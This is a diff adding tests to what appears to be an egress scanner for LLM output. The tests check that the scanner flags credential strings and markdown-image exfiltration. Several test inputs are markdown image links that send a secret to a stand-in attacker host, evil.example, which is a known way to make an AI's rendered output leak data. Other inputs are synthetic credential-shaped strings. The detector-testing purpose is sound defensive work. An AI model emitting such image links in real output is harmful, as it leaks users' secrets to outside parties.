@@ -341,3 +341,43 @@ test('all egress findings use CWE-200 and OWASP LLM02', () => {
     assert.equal(finding.owasp, 'LLM02:2025');
   }
 });
+
+test('markdown image exfiltration detects angle whitespace title reference and protocol-relative forms', () => {
+  const secret = 'abcdefghijklmnopqrstuvwx';
+  const inputs = [
+    '![x](<https://evil.example/img?data=' + secret + '>)',
+    '![x]( https://evil.example/img?data=' + secret + ' )',
+    '![x](https://evil.example/img?data=' + secret + ' "title")',
+    '![x][ref]\n\n[ref]: https://evil.example/img?data=' + secret,
+    '![x][]\n\n[x]: https://evil.example/img?data=' + secret,
+    '![x]\n\n[x]: https://evil.example/img?data=' + secret,
+    '![x](//evil.example/img?data=' + secret + ')'
+  ];
+  for (const input of inputs) {
+    assert.ok(hasFinding(scanEgress(input), 'GP-EGR-MARKDOWN-IMG-001'), input.slice(0, 40));
+  }
+});
+
+test('prefixed credential variable names with low entropy values are detected', () => {
+  for (const input of ['OPENAI_API_KEY=aaaaaaaaaaaaaaaaaaaa', 'AWS_SECRET_ACCESS_KEY=aaaaaaaaaaaaaaaaaaaa', 'GITHUB_TOKEN=aaaaaaaaaaaaaaaaaaaa']) {
+    assert.ok(hasFinding(scanEgress(input), 'GP-EGR-CREDENTIAL-001'), input);
+  }
+});
+
+test('vendor-shaped synthetic credentials are detected without storing literal keys', () => {
+  const inputs = [
+    's' + 'k-' + 'a'.repeat(20),
+    'gh' + 'p_' + 'a'.repeat(36),
+    'AK' + 'IA' + 'A'.repeat(16),
+    'AI' + 'za' + 'A'.repeat(24),
+    'xo' + 'xb-' + 'a'.repeat(10) + '-' + 'a'.repeat(10)
+  ];
+  for (const input of inputs) {
+    assert.ok(hasFinding(scanEgress(input), 'GP-EGR-CREDENTIAL-001'), input.slice(0, 10));
+  }
+});
+
+test('pretty-printed JSON credential fields are detected', () => {
+  const findings = scanEgress('{"api_key"\n:\n"cage-test-token-abcdef123456"}');
+  assert.ok(hasFinding(findings, 'GP-EGR-CREDENTIAL-001'));
+});
